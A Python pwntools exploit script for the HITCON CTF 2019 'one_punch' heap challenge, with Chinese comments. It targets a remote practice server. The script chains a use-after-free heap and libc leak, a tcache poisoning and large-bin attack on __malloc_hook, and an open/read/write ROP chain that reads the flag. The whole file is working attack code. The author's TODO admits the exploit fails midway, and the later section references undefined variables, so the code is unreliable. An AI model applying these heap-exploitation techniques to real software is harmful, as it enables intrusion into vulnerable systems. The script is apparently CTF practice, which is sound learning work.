#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 27583
elfpath = './hitcon_ctf_2019_one_punch_patched'
ldpath = './ld-2.29.so'
libcpath = './libc-2.29.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success(
    "{} ==> {}".format(func, hex(address)))


def command(c):
    ru(b'> ')
    sl(str(c).encode())
    # s(str(c).encode())


def add(index, size, content=b"zyleo"):
    command(1)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")
    s(content.ljust(size, b"a"))


def edit(index, content):
    command(2)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")
    s(content)


def free(index):
    command(4)
    ru(b"idx: ")
    sl(str(index).encode())


def show(index):
    command(3)
    ru(b"idx: ")
    sl(str(index).encode())
    ru(b"hero name: ")


def onePunch(content):
    command(50056)
    s(content)
    ru(b"Serious Punch!!!\n")

# start pwning
'''
glibc 2.29
orw沙箱
存在uaf
'''

add(0, 0x210)
free(0)
add(1, 0x210)
free(1)
show(1)
heap_base = u64(rn(6).ljust(8, b"\x00")) - 0x260
leak("heap", heap_base)
for i in range(5):
    add(2, 0x210)
    free(2)
add(0, 0x210)
add(1, 0x210)
free(0)
show(0)
malloc_hook = u64(rn(6).ljust(8, b"\x00")) - 0x70
libc.address = malloc_hook - libc.sym["__malloc_hook"]
leak("libc base", libc.address)

# 修改tcache bin[0x220]，这样分配两次就能到__malloc_hook
# 0x220 [  7]: 0x564d2c6bdf20 —▸ 0x7f64c7d18c30 (__malloc_hook) ◂— 0x0
edit(2, p64(libc.sym["__malloc_hook"]))

add(0, 0x90) # unsorted bin中剩余0x180

for i in range(7):
    add(0, 0x80)
    free(0)
for i in range(7):
    add(0, 0x200)
    free(0)

# calloc 不会遍历tcache哦
add(0, 0x200)
add(1, 0x210)
add(2, 0x90, p64(0x21)*18)
edit(2, p64(0x21)*18)# 因为数据是先写到栈上，然后strncpy过去的，所以会需要再edit一次
free(2)
add(2, 0x90, p64(0x21)*18)
edit(2, p64(0x21)*18)
free(2)


# chunk 0 和 chunk 1合并在一起
free(0)
free(1)
# 切割unsorted bin中的chunk
add(0, 0x80)
add(1, 0x80)
free(0)
free(1)
# 0 指向unsorted bin中的0x430大小chunk
add(0, 0x210, content=b'a'*0x88 + p64(0x421)) # 将1指向的chunk的size改写为0x421
add(2, 0x200)
# 此时，unsorted bin为空
free(1) # 将0x421大小（伪造）的chunk 1送入unsorted bin
free(2) # unsorted bin头部再插入chunk 2
add(2, 0x200) # 将0x421大小的chunk 1送入large bin

# 改写位于large bin中的chunk 1
edit(0, b'a'*0x88 + p64(0x421 ) + p64(libc.address + 0x1e5090)*2 + p64(0) + p64(heap_base + 0x10))

# chunk 0 与 chunk 2相邻，所以这两步free操作会在unsorted bin中放入一个0x430大小的chunk
free(0)
free(2)

if args.LOCAL:
    gdb.attach(p)
# TODO: 调到这里出问题了。。。心累，很讨厌这种不知道哪里有个小细节弄错了，但是又找不出来的感觉
# balsn 的官方wp：https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#one-punch-man

# 触发large bin attack
add(0, 0x200, content=b"flag\x00")
onePunch(b"a")

add_rsp_48 = libc_base + 0x000000000008cfd6
pop_rdi = libc_base + 0x0000000000026542
pop_rsi = libc_base + 0x0000000000026f9e
pop_rdx = libc_base + 0x000000000012bda6
pop_rax = libc_base + 0x0000000000047cf8
syscall_ret = libc_base + 0x000000000010D022

onePunch(p64(add_rsp_48))

flag_addr = heap_base + 0x24d0
ropchain = flat([
    # open("/flag", 0)
    pop_rdi, flag_addr,
    pop_rsi, 0,
    pop_rax, 2,
    syscall_ret,
    # read(3, flag_addr, 0x30)
    pop_rdi, 3,
    pop_rsi, heap,
    pop_rdx, 0x30,
    pop_rax, 0,
    syscall_ret,
    # write(1, flag_addr, 0x30)
    pop_rdi, 1,
    pop_rsi, heap,
    pop_rdx, 0x30,
    pop_rax, 1,
    syscall_ret
])
add(0, 0x100, content=ropchain)

shell()